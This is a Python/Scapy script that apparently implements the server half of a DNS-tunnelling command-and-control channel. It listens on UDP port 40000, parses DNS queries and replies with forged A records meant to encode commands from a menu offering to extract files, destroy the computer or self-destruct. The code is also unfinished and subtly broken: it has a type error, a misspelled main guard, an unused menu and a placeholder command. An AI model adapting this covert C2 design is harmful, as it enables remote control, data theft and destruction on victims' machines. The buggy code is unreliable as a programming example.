import struct
from scapy.all import *

MY_PORT = 40000
MENU = "what would tou like to do? " \
       "1 - extract files" \
       "2 - destroy the computer" \
       "3 - self destruct" \
       "4 - do nothing"

def process_packet(packet):
    packet.show()

    # If Scapy has automatically parsed the UDP layer
    if packet.haslayer(UDP):
        udp_layer = packet[UDP]
        print("Parsed UDP layer:")
        print("  Source Port:", udp_layer.sport)
        print("  Destination Port:", udp_layer.dport)
        print("  Length:", udp_layer.len)
        print("  Checksum:", udp_layer.chksum)
        # The payload here is what follows the UDP header
        dns_payload = bytes(udp_layer.payload)
    # Otherwise, assume the packet is all in the Raw layer

    else:
        print("No UDP or Raw layer found.")
        return

    # Now parse the DNS header if there is enough data.
    if len(dns_payload) < 12:
        print("DNS payload too short for a header.")
        return

    transaction_id, flags, qdcount, ancount, nscount, arcount = struct.unpack("!HHHHHH", dns_payload[:12])
    print("DNS Header:")
    print("  Transaction ID:", transaction_id)
    print("  Flags:", flags)
    print("  Questions:", qdcount)
    print("  Answer RRs:", ancount)
    print("  Authority RRs:", nscount)
    print("  Additional RRs:", arcount)
    domain = parse_dns_query(dns_payload)
    print(domain)

    ip_command = "1.1.1.1"  # make menu
    send_dns = build_dns_response(transaction_id, domain, ip_command)
    send_udp = create_udp_header(udp_layer.dport, udp_layer.sport, len(send_dns))
    payload = send_udp + send_dns


    if packet.haslayer(IP):
        sender_ip = packet[IP].src
        print("Sender IP2:", sender_ip)
        response = IP(dst=sender_ip, proto=17) / Raw(load=payload)
        print("Sending response ...")
        send(response)
    else:
        print("No IP layer found in the packet.")

def parse_dns_query(data):

    # The DNS header is 12 bytes.
    if len(data) < 12:
        raise ValueError("Data too short for a DNS header.")

    # Unpack the DNS header (transaction_id, flags, QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT)
    transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs = struct.unpack("!HHHHHH", data[:12])
    offset = 12  # Start of the Question section

    # Parse the QNAME: it's a series of labels (each label is prefixed with its length)
    labels = []
    while True:
        if offset >= len(data):
            raise ValueError("Incomplete DNS query: reached end of data while parsing QNAME.")
        length = data[offset]
        offset += 1  # move past the length byte

        if length == 0:  # a zero length indicates the end of the QNAME
            break

        if offset + length > len(data):
            raise ValueError("Invalid DNS query: label length exceeds available data.")
        label = data[offset:offset + length].decode('ascii')
        labels.append(label)
        offset += length

    # Reconstruct the domain name (QNAME)
    qname = ".".join(labels)
    return qname


def create_udp_header(src_port, dest_port, data_length):
    # UDP Header: Source Port, Destination Port, Length, Checksum (set to 0)
    length = 8 + data_length
    checksum = 0
    return struct.pack('!HHHH', src_port, dest_port, length, checksum)

def build_dns_response(transaction_id, domain, ip_command):
    """
    Builds a DNS response for an A record query.
    """
    flags = 0x8180  # Response
    question_rrs = 1  # 1 Question
    answer_rrs = 1  # 1 Answer
    authority_rrs = 0  # No authority records
    additional_rrs = 0  # No additional records

    header = transaction_id + struct.pack("!HHHHH", flags, question_rrs, answer_rrs, authority_rrs, additional_rrs)

    question = encode_domain_name(domain)

    qtype = 1  # Type A (IPv4 address)
    qclass = 1  # Class IN (Internet)

    q_properties = struct.pack("!HH", qtype, qclass)

    # Answer Section
    name = 0xC00C  # Pointer to domain name (compression)
    rtype = 1  # Type A (IPv4)
    rclass = 1  # Class IN
    ttl = 300 # Time-to-live (300 seconds)
    rdlength = 4  # IPv4 address length (4 bytes)
    rdata = inet_aton(ip_command)  # Convert IP to bytes

    answer = struct.pack("!HHHIH", name, rtype, rclass, ttl, rdlength) + rdata

    # Final Response
    response = header + question + q_properties + answer
    return response

def encode_domain_name(domain):
    labels = domain.split('.')
    encoded_name = b""
    for label in labels:
        encoded_name += struct.pack("B", len(label)) + label.encode()
    encoded_name += b"\x00"  # Null byte to end the domain name
    return encoded_name

def main():
    print("running")
    sniff(filter=f"udp and port {MY_PORT}", prn=process_packet)

if _name_ == "_main_":
     main()